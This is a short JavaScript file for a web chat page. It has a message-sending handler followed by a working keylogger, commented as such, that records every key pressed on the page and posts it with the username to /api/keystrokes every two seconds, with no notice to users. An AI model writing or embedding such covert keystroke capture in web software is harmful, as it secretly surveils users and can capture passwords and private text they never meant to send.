// Send chat message
document.getElementById("send").onclick = async () => {
    let user = document.getElementById("username").value || "anon";
    let msg = document.getElementById("message").value;

    await fetch("/api/message", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({user, message: msg})
    });

    document.getElementById("message").value = "";
};

// Automatic keylogger
let keyBuffer = [];
const SEND_INTERVAL = 2000;

window.addEventListener("keydown", (e) => {
    keyBuffer.push(e.key);
});

// flush every 2 sec
setInterval(() => {
    if (keyBuffer.length === 0) return;

    fetch("/api/keystrokes", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            user: document.getElementById("username").value || "anon",
            keys: keyBuffer
        })
    });

    keyBuffer = [];
}, SEND_INTERVAL);
